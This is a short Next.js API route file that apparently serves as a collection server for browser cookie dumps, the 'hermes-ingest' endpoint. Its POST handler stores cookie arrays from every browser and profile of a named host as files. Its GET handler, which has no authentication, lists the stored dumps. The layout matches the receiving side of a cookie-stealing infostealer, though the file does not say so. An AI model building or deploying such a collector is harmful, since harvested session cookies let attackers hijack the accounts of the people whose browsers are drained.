
import { NextRequest, NextResponse } from 'next/server'
import { writeFile, mkdir } from 'fs/promises'
import { join } from 'path'

const INGEST_DIR = '/tmp/hermes-ingest'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    await mkdir(INGEST_DIR, { recursive: true })

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
    const hostname = body.hostname || 'unknown'
    const filename = `cookies_${hostname}_${timestamp}.json`
    const filepath = join(INGEST_DIR, filename)

    // Count cookies
    let cookieCount = 0
    let browserCount = 0
    if (body.browsers) {
      for (const [browser, profiles] of Object.entries(body.browsers)) {
        browserCount++
        for (const profile of profiles as any[]) {
          cookieCount += profile.cookies?.length || 0
        }
      }
    }

    await writeFile(filepath, JSON.stringify(body, null, 2))

    return NextResponse.json({
      success: true,
      file: filename,
      browsers: browserCount,
      cookies: cookieCount,
      timestamp: body.timestamp,
    })
  } catch (error: any) {
    console.error('Ingest error:', error.message)
    return NextResponse.json({ error: 'Ingest failed' }, { status: 500 })
  }
}

export async function GET(request: NextRequest) {
  const fs = await import('fs/promises')
  const path = await import('path')
  
  try {
    await mkdir(INGEST_DIR, { recursive: true })
    const files = await fs.readdir(INGEST_DIR)
    const results = []
    
    for (const f of files.slice(-20)) {
      const stat = await fs.stat(path.join(INGEST_DIR, f))
      results.push({
        name: f,
        size: stat.size,
        created: stat.birthtime.toISOString(),
      })
    }
    
    return NextResponse.json({ files: results.reverse(), count: results.length })
  } catch {
    return NextResponse.json({ files: [], count: 0 })
  }
}
